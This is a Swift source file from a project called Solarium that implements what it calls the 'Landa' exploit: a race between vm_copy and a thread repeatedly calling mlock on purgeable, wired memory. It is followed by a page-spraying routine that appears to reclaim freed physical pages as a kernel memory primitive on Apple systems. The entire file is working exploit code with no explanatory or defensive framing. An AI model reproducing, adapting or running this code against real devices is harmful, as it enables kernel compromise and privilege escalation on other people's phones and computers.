//
//  freePage.swift
//  Solarium
//
//  Created by Kien Ho on 11/5/26.
//

import Foundation
import Atomics
import os

class freePages {
    let base: vm_address_t
    let count: Int
    let primitive: Landa
    
    init?(count: Int) {
        self.count = count
        let primitive = Landa()
        self.primitive = primitive
        let base = primitive.prime(count: count)
        guard base != 0 else { return nil }
        self.base = base
    }
    
    func getBase() -> vm_address_t {
        return base
    }
    
    func getCount() -> Int {
        return count
    }
    
    func grabFreePages() -> Bool {
        let MAX_PAGE_CNT: Int = 400_000
        var pageMatched: UInt64 = 0
        var src: vm_address_t = 0
        var dst: vm_address_t = 0
        let pageSize = pages(1)

        var kr = vm_allocate(mach_task_self_, &src, pageSize, VM_FLAGS_ANYWHERE)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(describing: mach_error_string(kr)))")
            return false
        }

        let hexChars = Array("0123456789abcdef".utf8)
        let pattern = (0..<16).map { _ in hexChars.randomElement()! }
        pattern.withUnsafeBufferPointer { buf in
            memset_pattern16(UnsafeMutableRawPointer(bitPattern: UInt(src))!, buf.baseAddress, Int(pageSize))
        }

        kr = vm_allocate(mach_task_self_, &dst, pages(MAX_PAGE_CNT), VM_FLAGS_ANYWHERE)
        if kr != KERN_SUCCESS {
            vm_deallocate(mach_task_self_, src, pageSize)
            return false
        }

        var dstAllocated = true
        defer {
            if dstAllocated {
                vm_deallocate(mach_task_self_, dst, pages(MAX_PAGE_CNT))
            }
            vm_deallocate(mach_task_self_, src, pageSize)
        }
        let srcPtr = UnsafeRawPointer(bitPattern: UInt(src))!
        let patternLen = Int(MemoryLayout.size(ofValue: pattern) == 16 ? 16 : 16)

        for i in 0..<MAX_PAGE_CNT {
            kr = vm_copy(mach_task_self_, src, pageSize, dst + pages(i))
            if kr != KERN_SUCCESS {
                print("[Landa] Copying page failed at page \(i): \(String(cString: mach_error_string(kr)))")
                return false
            }
            for j in 0..<count {
                let rangePage = UnsafeRawPointer(bitPattern: UInt(base + pages(j)))!
                if memcmp(srcPtr, rangePage, patternLen) == 0 {
                    pageMatched += 1
                }
                if pageMatched >= UInt64(count / 5) {
                    print("[Landa] Allocated \(i), matched with \(pageMatched)")
                    return true
                }
            }
        }
        print("[Landa] Fail to meet free page goal: \(pageMatched)")
        return false
    }
}


class Landa {
    var start: vm_address_t = 0;
    var end: vm_address_t = 0;

    final class SpinnerArgs {
        let address: vm_address_t
        let size: vm_size_t
        let state = ManagedAtomic<UInt8>(0)

        init(address: vm_address_t, size: vm_size_t) {
            self.address = address
            self.size = size
        }
    }
    
    init() {
        
    }
    
    func prime(count: Int) -> vm_address_t {
        let sz: [vm_size_t] = [pages(count + 2), pages(1), pages(1), pages(count), pages(1)]
        var s: [vm_address_t] = [0, 0, 0, 0, 0]
        var d: [vm_address_t] = [0, 0, 0, 0, 0]
        print("[Landa] Starting exploit.")
        var kr = vm_allocate(mach_task_self_, &s[0], sz[0], VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        s[1] = s[0]
        s[2] = s[1] + sz[1]
        s[3] = s[2] + sz[2]
        s[4] = s[3] + sz[3]
        
        for i in 1...3 {
            kr = vm_allocate(mach_task_self_, &s[i], sz[i], VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE)
            if kr != KERN_SUCCESS {
                print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
                return 0
            }
        }
        UnsafeMutableRawPointer(bitPattern: Int(s[0]))!.initializeMemory(as: UInt8.self, repeating: 0x41, count: Int(sz[0]))
        
        kr = vm_allocate(mach_task_self_, &d[0], sz[0] + sz[4], VM_FLAGS_ANYWHERE | VM_FLAGS_RANDOM_ADDR)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        d[1] = d[0]
        d[2] = d[1] + sz[1]
        d[3] = d[2] + sz[2]
        d[4] = d[3] + sz[3]
        
        kr = vm_allocate(mach_task_self_, &d[1], sz[1], VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        
        kr = vm_allocate(mach_task_self_, &d[2], sz[2], VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        var curProt: vm_prot_t = VM_PROT_DEFAULT
        var maxProt: vm_prot_t = VM_PROT_DEFAULT | VM_PROT_EXECUTE
        kr = vm_remap(mach_task_self_, &d[2], sz[2], 0, VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE,
                      mach_task_self_, d[2], 0, &curProt, &maxProt, VM_INHERIT_DEFAULT)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_remap failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        kr = vm_allocate(mach_task_self_, &d[3], sz[3] + sz[4], VM_FLAGS_FIXED | VM_FLAGS_OVERWRITE | VM_FLAGS_PURGABLE)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_allocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        kr = vm_protect(mach_task_self_, d[4], sz[4], 0, VM_PROT_READ)
        if kr != KERN_SUCCESS {
            print("[Landa] vm_protect failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        UnsafeMutableRawPointer(bitPattern: Int(d[0]))!.initializeMemory(as: UInt8.self, repeating: 0x42, count: Int(sz[0]))
        
        for _ in 0..<Int(UInt16.max) {
            if mlock(UnsafeMutableRawPointer(bitPattern: UInt(d[1]))!, Int(sz[1])) != 0 {
                print("[Landa] mlock failed.")
                return 0
            }
        }
        if mlock(UnsafeMutableRawPointer(bitPattern: UInt(d[2]))!, Int(sz[2])) != 0 {
            print("[Landa] mlock failed.")
            return 0
        }
        
        let args = SpinnerArgs(address: d[0], size: sz[0])
        let spinner = Thread {
            let p = UnsafeMutableRawPointer(bitPattern: UInt(args.address))!
            let len = Int(args.size)
            args.state.store(1, ordering: .sequentiallyConsistent)
            while args.state.load(ordering: .sequentiallyConsistent) != 2 {
                if mlock(p, len) == 0 { break }
                if errno != 12 {
                    print("[Landa] mlock failed with unknown error.")
                    break
                }
            }
        }
        spinner.start()
        while args.state.load(ordering: .sequentiallyConsistent) != 1 { usleep(10) }

        kr = vm_copy(mach_task_self_, s[0], sz[0], d[0])
        if kr != KERN_SUCCESS {
            print("[Landa] vm_copy failed with error: \(String(cString: mach_error_string(kr)))")
            args.state.store(2, ordering: .sequentiallyConsistent)
            while !spinner.isFinished { usleep(10) }
            return 0
        }
        args.state.store(2, ordering: .sequentiallyConsistent)
        while !spinner.isFinished { usleep(10) }
        
        kr = vm_deallocate(mach_task_self_, d[4], sz[4])
        if kr != KERN_SUCCESS {
            print("[Landa] vm_deallocate failed with error: \(String(cString: mach_error_string(kr)))")
            return 0
        }
        print("[Landa] Exploit completed successfully.")
        start = d[3]
        end = d[3] + sz[0]
        return d[3]
    }
    
    func cleanup() {
        guard start != 0, end > start else {
            print("[Landa] Nothing to cleanup.")
            return
        }
        let kr = vm_deallocate(mach_task_self_, start, vm_size_t(end - start))
        if kr == KERN_SUCCESS {
            print("[Landa] Deallocating [0x\(String(start, radix: 16)), 0x\(String(end, radix: 16))).")
        } else {
            print("[Landa] vm_deallocate failed with error: \(String(cString: mach_error_string(kr)))")
        }
        start = 0
        end = 0
    }
}
